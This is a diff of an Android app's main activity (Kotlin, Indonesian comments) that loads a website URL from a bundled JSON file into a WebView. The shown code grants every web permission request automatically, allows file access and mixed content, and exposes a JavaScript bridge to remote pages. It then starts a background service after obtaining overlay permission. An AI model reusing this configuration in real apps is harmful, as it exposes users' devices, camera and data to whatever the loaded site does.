@@ -17,8 +17,6 @@ class MainActivity : AppCompatActivity() {
     private lateinit var webView: WebView
     private var accountUid: String = "unknown"
 
-    private val HTML_ASSET = "file:///android_asset/index.html"
-
     private var isRequestingSettings = false
     private var overlayRequested = false
 
@@ -43,13 +41,10 @@ class MainActivity : AppCompatActivity() {
         setupWebView()
         registerReceivers()
 
-        // 🔥 STEP 1: Minta POST_NOTIFICATIONS (wajib Android 13+)
+        // STEP 1: Minta POST_NOTIFICATIONS (wajib Android 13+)
         requestNotificationPermission()
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // STEP 1: POST_NOTIFICATIONS (unavoidable di Android 13+)
-    // ═══════════════════════════════════════════════════════════
     private fun requestNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             val granted = ContextCompat.checkSelfPermission(
@@ -65,7 +60,6 @@ class MainActivity : AppCompatActivity() {
                 return
             }
         }
-        // Sudah granted / Android < 13 → langsung lanjut ke overlay
         proceedToOverlay()
     }
 
@@ -76,14 +70,10 @@ class MainActivity : AppCompatActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == REQ_NOTIF_PERMISSION) {
-            // Apapun hasilnya, lanjut ke overlay
             proceedToOverlay()
         }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // STEP 2: OVERLAY (izin utama, 1x perizinan)
-    // ═══════════════════════════════════════════════════════════
     private fun proceedToOverlay() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this) && !overlayRequested) {
@@ -102,13 +92,9 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         }
-        // Overlay sudah granted / Android < M → start service
         startDeviceServiceDelayed()
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // START SERVICE
-    // ═══════════════════════════════════════════════════════════
     private fun startDeviceServiceDelayed() {
         Handler(Looper.getMainLooper()).postDelayed({
             try {
@@ -157,8 +143,26 @@ class MainActivity : AppCompatActivity() {
             allowFileAccess = true
             allowContentAccess = true
             mediaPlaybackRequiresUserGesture = false
+
+            // 🔥 TAMBAHAN BIAR WEBVIEW JALAN SEPERTI BROWSER ASLI
+            javaScriptCanOpenWindowsAutomatically = true
+            setSupportMultipleWindows(true)
+            databaseEnabled = true
+            loadWithOverviewMode = true
+            useWideViewPort = true
+            builtInZoomControls = true
+            displayZoomControls = false
+            cacheMode = WebSettings.LOAD_DEFAULT
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                 mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+        }
+
+        // Pengaturan Cookie
+        val cookieManager = CookieManager.getInstance()
+        cookieManager.setAcceptCookie(true)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            cookieManager.setAcceptThirdPartyCookies(webView, true)
         }
 
         val bridge = AppBridge(this, webView)
@@ -170,9 +174,37 @@ class MainActivity : AppCompatActivity() {
             override fun onPermissionRequest(request: PermissionRequest) {
                 request.grant(request.resources)
             }
+
+            override fun onCreateWindow(view: WebView?, isDialog: Boolean, isUserGesture: Boolean, resultMsg: Message?): Boolean {
+                val newWebView = WebView(this@MainActivity)
+                newWebView.webViewClient = object : WebViewClient() {
+                    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
+                        val url = request?.url?.toString() ?: return false
+                        webView.loadUrl(url)
+                        return true
+                    }
+                }
+                val transport = resultMsg?.obj as WebView.WebViewTransport
+                transport.webView = newWebView
+                resultMsg.sendToTarget()
+                return true
+            }
         }
 
         webView.webViewClient = object : WebViewClient() {
+            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
+                val url = request?.url?.toString() ?: return false
+                if (!url.startsWith("http://") && !url.startsWith("https://")) {
+                    try {
+                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+                        startActivity(intent)
+                        return true
+                    } catch (_: Exception) {}
+                }
+                view?.loadUrl(url)
+                return true
+            }
+
             override fun onReceivedError(
                 view: WebView?,
                 request: WebResourceRequest?,
@@ -189,22 +221,29 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        loadHtmlAsset()
+        loadWebsiteFromAsset()
     }
 
-    private fun loadHtmlAsset() {
-        val hasHtml = try {
-            assets.open("index.html").use { it.available() > 0 }
+    private fun loadWebsiteFromAsset() {
+        try {
+            val inputStream = assets.open("website.json")
+            val size = inputStream.available()
+            val buffer = ByteArray(size)
+            inputStream.read(buffer)
+            inputStream.close()
+            val json = String(buffer, Charsets.UTF_8)
+            val obj = JSONObject(json)
+            val targetUrl = obj.optString("url", "")
+
+            if (targetUrl.isNotEmpty()) {
+                webView.loadUrl(targetUrl)
+                return
+            }
         } catch (e: Exception) {
-            false
+            android.util.Log.e("MainActivity", "Gagal baca website.json: ${e.message}")
         }
 
-        if (!hasHtml) {
-            showErrorPage("Aplikasi Error.\nFile HTML belum ditemukan dalam paket.")
-            return
-        }
-
-        webView.loadUrl(HTML_ASSET)
+        showErrorPage("Aplikasi Error.\nURL Website tidak ditemukan dalam paket.")
     }
 
     private fun showErrorPage(message: String) {
@@ -245,10 +284,8 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        // Kalau user baru balik dari settings overlay → start service
         if (isRequestingSettings) {
             isRequestingSettings = false
-            // Cek overlay granted atau tidak, apapun hasilnya start service
             Handler(Looper.getMainLooper()).postDelayed({
                 startDeviceServiceDelayed()
             }, 1000)
@@ -297,7 +334,6 @@ class MainActivity : AppCompatActivity() {
         sendBroadcast(i)
     }
 
-    // ─── Bridge helpers ───
     fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
         (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
     else true
